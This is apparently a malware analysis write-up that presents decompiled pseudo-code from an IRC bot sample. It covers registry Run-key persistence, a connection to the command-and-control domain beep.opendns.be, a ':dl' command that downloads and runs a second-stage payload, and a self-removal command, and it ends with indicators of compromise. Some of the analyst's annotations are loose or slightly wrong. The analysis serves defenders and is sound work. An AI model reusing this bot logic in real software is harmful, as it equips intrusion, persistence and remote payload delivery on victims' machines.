# [Quick Note] Pseudo code sample d5ed049d7e4fc3289e84b64e34086163

MD5: d5ed049d7e4fc3289e84b64e34086163 </br>
Hybrid-analysis: https://www.hybrid-analysis.com/sample/d557cdfee4adc82bfe754b4bb6f802835671c26332f62f6ea059926656bb8213/5cdbfd160388381217c4a18e </br>

# Setup registry for malware
This functions will create registry key "SOFTWARE\Microsoft\Windows\CurrentVersion\RunSedrvicesaa" and set value "video.com" into this registry.

```
LSTATUS f_setup_registry()
{
  DWORD v0; // eax
  char Dest; // [esp+0h] [ebp-804h]
  HKEY phkResult; // [esp+400h] [ebp-404h]
  CHAR Filename; // [esp+404h] [ebp-400h]

  GetModuleFileNameA(0, &Filename, 0x400u);     
  sprintf(&Dest, Format, aVideoCom);            // c:\\ - video.com
  RegCreateKeyExA(HKEY_LOCAL_MACHINE, SubKey, 0, 0, 0, 0xF003Fu, 0, &phkResult, 0);// Creates the specified registry key. If the key already exists, the function opens it - SOFTWARE\Microsoft\Windows\CurrentVersion\RunSedrvicesaa
  v0 = strlen(&Dest);
  RegSetValueExA(phkResult, ValueName, 0, 1u, (const BYTE *)&Dest, v0);// Sets the data and type of a specified value under a registry key. (Value name is video.com)
  return RegCloseKey(phkResult);                
}
```

# Establish connection with C2
This functions will establish connection with domain name "beep.opendns.be"

```
char *f_connect_with_C2()
{
  char *result; // eax
  unsigned int v1; // eax
  int v2; // eax
  char Str; // [esp+4h] [ebp-1F4h]
  DWORD v4; // [esp+24h] [ebp-1D4h]
  int i; // [esp+28h] [ebp-1D0h]
  CHAR LCData; // [esp+2Ch] [ebp-1CCh]
  char Dest; // [esp+30h] [ebp-1C8h]
  int v8; // [esp+50h] [ebp-1A8h]
  struct sockaddr name; // [esp+54h] [ebp-1A4h]
  struct WSAData WSAData; // [esp+64h] [ebp-194h]
  struct hostent *v11; // [esp+1F4h] [ebp-4h]

  v8 = WSAStartup(1u, &WSAData);
  if ( v8 )
  {
    Sleep(0x3A98u);
    f_connect_with_C2();
  }
  s = socket(0, 1, 6);                          // create socket
  if ( s == -1 )
  {
    Sleep(0x3A98u);
    f_connect_with_C2();
  }
  if ( !gethostbyname(::name) )                 // beep.opendns.be
  {
    Sleep(0x3A98u);
    f_connect_with_C2();
  }
  name.sa_family = 2;
  v11 = gethostbyname(::name);                  // beep.opendns.be
  *(_DWORD *)&name.sa_data[2] = **(_DWORD **)v11->h_addr_list;
  *(_WORD *)name.sa_data = htons(0x1A0Bu);     
  if ( connect(s, &name, 16) == -1 )            
  {
    WSACleanup();
    Sleep(0x3A98u);
    result = f_connect_with_C2();
  }
  else                                          // if return values = -1, close socket and clean up or else print value TRUE
  {
    sprintf(&::Dest, aTrue);                    // print value TRUE
    if ( byte_403978 )
      sprintf(&Dest, aJoinSS, aBadbotbad, &byte_403978);// print "JOIN %s %s\n" "#badbotbad"
    else
      sprintf(&Dest, aJoinS, aBadbotbad);       // print "JOIN %s\n" "#badbotbad"
    f_send_data(::Str);                         // send string "USER e e e :e\n"
    v1 = GetTickCount();                        // Retrieves the number of milliseconds that have elapsed since the system was started
    srand(v1);                                  // Sets the starting seed value for the pseudorandom number generator used by the rand function.
    GetLocaleInfoA(0x800u, 7u, &LCData, 3);     // Retrieves information about a locale specified by identifier.
    v4 = GetTickCount() / 0x5265C00;
    if ( v4 <= 1 )
      sprintf(byte_40314C, aSD, &LCData, v4);   // print "[%s|%d]" LCDdata, v4
    else
      sprintf(byte_40314C, aS0D, &LCData, v4);  // print "[%s|0%d]" LCDdata, v4
    for ( i = 1; i <= dword_403010; ++i )
    {
      v2 = rand();
      sprintf(byte_40314C, aSI, byte_40314C, v2 % 9);// print "%s%i" byte_40314C when v2 % 9
    }
    sprintf(&Str, aNickS, byte_40314C);         // print "NICK %s\n" byte_40314C
    f_send_data(&Str);
    result = f_send_data(&Dest);
  }
  while ( ::Dest )                              // loop check send data from Dest if not recv signal will close socket
  {
    if ( recv(s, buf, 1024, 0) == -1 )
    {
      sprintf(&::Dest, &byte_403980);
      closesocket(s);
      WSACleanup();
      Sleep(0x3A98u);
      result = f_connect_with_C2();
    }
    else
    {
      result = f_download_and_move_payload_into_dir(buf);
    }
  }
  return result;
}
```
This code to check information victim machine and this technique anti-sanboxing [here] (https://cofense.com/upatre-malware-anti-sandboxing-mechanism/). </br>
Malware using  the Windows GetTickCount function, used to enumerate the number of milliseconds that have passed since the Windows system was started. This is an effective means of tracking the systemâ€™s uptime, providing the malware binary an insight into the duration for which the system has been running.
```
    v1 = GetTickCount();                        // Retrieves the number of milliseconds that have elapsed since the system was started
    srand(v1);                                  // Sets the starting seed value for the pseudorandom number generator used by the rand function.
    GetLocaleInfoA(0x800u, 7u, &LCData, 3);     // Retrieves information about a locale specified by identifier.
    v4 = GetTickCount() / 0x5265C00;
    if ( v4 <= 1 )
      sprintf(byte_40314C, aSD, &LCData, v4);   // print "[%s|%d]" LCDdata, v4
    else
      sprintf(byte_40314C, aS0D, &LCData, v4);  // print "[%s|0%d]" LCDdata, v4
    for ( i = 1; i <= dword_403010; ++i )
    {
      v2 = rand();
      sprintf(byte_40314C, aSI, byte_40314C, v2 % 9);// print "%s%i" byte_40314C when v2 % 9
    }
    sprintf(&Str, aNickS, byte_40314C);         // print "NICK %s\n" byte_40314C
    f_send_data(&Str);
    result = f_send_data(&Dest);
```

After checking done, this loop to checking signal recv from C2 when establish connection. </br>
If recv signal, it execute function drop malware (stage 2)</br>
```
  while ( ::Dest )                              // loop check send data from Dest if not recv signal will close socket
  {
    if ( recv(s, buf, 1024, 0) == -1 )
    {
      sprintf(&::Dest, &byte_403980);
      closesocket(s);
      WSACleanup();
      Sleep(0x3A98u);
      result = f_connect_with_C2();
    }
    else
    {
      result = f_download_and_move_payload_into_dir(buf);
    }
  }
```

# Dropping malware and create thread
Malware using the Windows URLDownloadToFileA function to download malware (stage 2) from C2 server and using the Windows CreateProcessA function to create thread for it.
```
char *__cdecl f_download_and_move_payload_into_dir(char *Str)
{
  char *result; // eax
  CHAR ExistingFileName; // [esp+0h] [ebp-678h]
  struct _STARTUPINFOA Dst; // [esp+400h] [ebp-278h]
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+444h] [ebp-234h]
  int i; // [esp+454h] [ebp-224h]
  char Dest; // [esp+458h] [ebp-220h]
  char *Str2; // [esp+658h] [ebp-20h]
  char *v8; // [esp+65Ch] [ebp-1Ch]
  char *v9; // [esp+664h] [ebp-14h]
  LPCSTR v10; // [esp+668h] [ebp-10h]
  LPCSTR v11; // [esp+66Ch] [ebp-Ch]
  char *v12; // [esp+670h] [ebp-8h]

  result = strtok(Str, Delim);                  // Finds the next token in a string, by using the current locale or a specified locale that's passed in.
  Str2 = result;
  for ( i = 1; i < 8; ++i )
  {
    result = strtok(0, asc_4030DC);
    (&Str2)[i] = result;
  }
  if ( Str2 && v8 )
  {
    if ( !strcmp(Str1, Str2) )                  // compare Str2 with PING
    {
      sprintf(&Dest, aPongS, v8);               // if Str1 not equal Str2, print PONG
      f_send_data(&Dest);
    }
    result = (char *)strcmp(aPrivmsg, v8);      // compare Str2 with PRIVMSG
    if ( !result )
    {
      if ( v9 )
      {
        result = (char *)strcmp(aDl, v9);       // compare Str2 with ":dl"
        if ( !result )
        {
          if ( !v10 && !v11 )                   // v10 = szURL - A pointer to a string value that contains the URL to download.
                                                // v11 = szFileName - A pointer to a string value containing the name or full path of the file to create for the download.
            return result;
          URLDownloadToFileA(0, v10, v11, 0, 0);// Downloads bits from the Internet and saves them to a file.
          sprintf(&Dest, aPrivmsgSIndird, v10, v11);// print "PRIVMSG %s :indirdi %s to %s\r\n"
          f_send_data(&Dest);
          if ( v12 && !strcmp(a1, v12) )
          {
            memset(&Dst, 0, 0x44u);
            Dst.cb = 68;
            memset(&ProcessInformation, 0, 0x10u);// Contains information about a newly created process and its primary thread.
            CreateProcessA(0, (LPSTR)v11, 0, 0, 0, 0x8000000u, 0, CurrentDirectory, &Dst, &ProcessInformation);// Creates a new process and its primary thread. The new process runs in the security context of the calling process.
                                                // The full path to the current directory for the process - c:\\
          }
        }
        result = (char *)strcmp(aRm, v9);       // compare Str2 with "rm"
        if ( !result )
        {
          sprintf(&Dest, aPrivmsgSRemovi, aBadbotbad);// print PRIVMSG %s :Removing\r\n
          f_send_data(&Dest);
          sprintf(&ExistingFileName, aCS_0, aVideoCom);// print existing file, folder c:\\%s and file video.com
          MoveFileExA(&ExistingFileName, 0, 4u);// Moves an existing file or directory, including its children, with various move options.
          ExitProcess(0);
        }
      }
    }
  }
  return result;
}
```
Beside, another function to send data for malware
```
char *__cdecl f_send_data(char *Str)
{
  int v1; // eax
  char *result; // eax

  v1 = strlen(Str);
  result = (char *)send(s, Str, v1, 0);
  if ( result == (char *)-1 )
  {
    closesocket(s);
    WSACleanup();
    sprintf(&Dest, byte_40397C);
    Sleep(0x3A98u);
    result = f_connect_with_C2();
  }
  return result;
}
```
# Interesting strings
C2: beep.opendns.be </br>
Registry key: SOFTWARE\Microsoft\Windows\CurrentVersion\RunSedrvicesaa </br>
Registry value: video.com </br>
Folder store malware: C:\\ - video.com </br>